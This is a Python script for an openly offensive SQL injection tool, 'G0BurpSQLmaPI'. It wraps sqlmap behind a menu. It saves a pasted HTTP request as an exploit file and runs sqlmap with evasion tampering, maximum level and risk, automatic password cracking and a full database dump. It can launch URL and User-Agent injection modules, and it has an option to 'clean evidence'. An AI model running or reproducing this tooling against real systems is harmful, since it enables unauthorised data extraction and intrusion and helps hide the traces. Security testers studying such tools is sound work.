#!/usr/bin/env python3
# G0BurpSQLmaPI by nu11secur1ty 2023–2025

import os
import sys
import time
from colorama import init, Fore, Style
init(convert=True)

def display_menu():
    print(Fore.CYAN + "\n===== G0BurpSQLmaPI Menu =====\n" + Style.RESET_ALL)
    print("1. Generate PoC exploit.txt")
    print("2. Start SQLi with sqlmap")
    print("3. Start G0BurpSQLmaPIURLi (module)")
    print("3.1 Start G0BurpSQLmaPIUser-Agent (module)")
    print("4. Clean evidence (delete exploit.txt)")
    print("5. Exit\n")

def create_exploit_file():
    print(Fore.GREEN + "Paste your full POST or GET request below (must start with POST or GET).")
    print("Enter a single dot '.' on a new line to finish input or type 'exit' to cancel.\n" + Style.RESET_ALL)

    lines = []
    while True:
        line = input()
        if line.lower() == 'exit':
            print(Fore.YELLOW + "Cancelled PoC creation, returning to menu..." + Style.RESET_ALL)
            time.sleep(1)
            return
        if line.strip() == '.':
            break
        lines.append(line)

    payload = "\n".join(lines).strip()

    if not (payload.startswith("POST") or payload.startswith("GET")):
        print(Fore.RED + "❌ ERROR: Payload must start with POST or GET request. Returning to menu..." + Style.RESET_ALL)
        time.sleep(2)
        return

    # Ask for vulnerable parameter(s)
    vuln_params = input(Fore.CYAN + "Enter vulnerable parameter(s) (comma separated if multiple): " + Style.RESET_ALL).strip()
    if not vuln_params:
        print(Fore.YELLOW + "No vulnerable parameter provided. Returning to menu..." + Style.RESET_ALL)
        time.sleep(2)
        return
    vuln_params_list = [p.strip() for p in vuln_params.split(',') if p.strip()]
    print(Fore.GREEN + f"Vulnerable parameters set: {vuln_params_list}" + Style.RESET_ALL)

    # Save payload to exploit.txt
    env = os.path.join(os.getcwd(), "modules")
    if not os.path.exists(env):
        os.makedirs(env)
    exploit_path = os.path.join(env, "exploit.txt")

    try:
        with open(exploit_path, "w", encoding="utf-8") as f:
            f.write(payload)
        print(Fore.GREEN + f"✅ PoC payload saved to '{exploit_path}'" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"❌ Failed to write exploit file: {e}" + Style.RESET_ALL)

    print(Fore.YELLOW + "Waiting 2 seconds before returning to menu..." + Style.RESET_ALL)
    time.sleep(2)

def run_sqlmap():
    env = os.path.join(os.getcwd(), "modules")
    exploit_path = os.path.join(env, "exploit.txt")

    if not os.path.isfile(exploit_path):
        print(Fore.RED + f"❌ ERROR: '{exploit_path}' not found. Please generate PoC first." + Style.RESET_ALL)
        time.sleep(2)
        return

    sqlmap_path = r"D:\CVE\sqlmap-nu11secur1ty\sqlmap.py"  # Adjust if needed

    cmd = (
        f'python "{sqlmap_path}" -r "{exploit_path}" --tamper=space2comment '
        '--dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 '
        '--batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
    )

    print(Fore.YELLOW + "\n[+] Starting sqlmap with your exploit file...\n" + Style.RESET_ALL)
    os.system(cmd)
    print(Fore.RED + "\nHappy hunting with nu11secur1ty =)" + Style.RESET_ALL)

def run_module(module_path):
    if not os.path.isfile(module_path):
        print(Fore.RED + f"❌ ERROR: Module '{module_path}' not found." + Style.RESET_ALL)
        time.sleep(2)
        return

    print(Fore.YELLOW + f"\n[+] Running module {os.path.basename(module_path)}...\n" + Style.RESET_ALL)
    os.system(f'python "{module_path}"')
    print(Fore.RED + "\nHappy hunting with nu11secur1ty =)" + Style.RESET_ALL)

def clean_up():
    env = os.path.join(os.getcwd(), "modules")
    exploit_path = os.path.join(env, "exploit.txt")
    deleted = False

    try:
        if os.path.isfile(exploit_path):
            os.remove(exploit_path)
            print(Fore.GREEN + "🧹 'exploit.txt' has been deleted." + Style.RESET_ALL)
            deleted = True
    except Exception as e:
        print(Fore.RED + f"❌ ERROR deleting 'exploit.txt': {e}" + Style.RESET_ALL)

    if not deleted:
        print(Fore.YELLOW + "No 'exploit.txt' file found to delete." + Style.RESET_ALL)

    time.sleep(2)

def main():
    valid_choices = {'1', '2', '3', '3.1', '4', '5'}

    try:
        while True:
            display_menu()
            choice = input(Fore.YELLOW + "Enter your choice: " + Style.RESET_ALL).strip()

            if choice not in valid_choices:
                print(Fore.RED + "❌ Invalid choice. Please enter a valid menu option number." + Style.RESET_ALL)
                time.sleep(1)
                continue

            if choice == '1':
                create_exploit_file()
            elif choice == '2':
                run_sqlmap()
            elif choice == '3':
                run_module(os.path.join("modules", "URLi.py"))
            elif choice == '3.1':
                run_module(os.path.join("modules", "User-Agent.py"))
            elif choice == '4':
                clean_up()
            elif choice == '5':
                print(Fore.GREEN + "Exiting... Happy hunting ☠️\n" + Style.RESET_ALL)
                break

            time.sleep(1)

    except KeyboardInterrupt:
        print(Fore.RED + "\nInterrupted. Exiting cleanly." + Style.RESET_ALL)
        sys.exit(0)

if __name__ == "__main__":
    main()
